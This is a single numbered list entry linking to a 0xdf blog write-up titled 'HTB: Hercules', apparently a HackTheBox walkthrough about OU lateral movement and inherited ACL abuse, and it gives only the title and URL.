- [18] [HTB：Hercules — OU 横向移动与继承 ACL 滥用](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
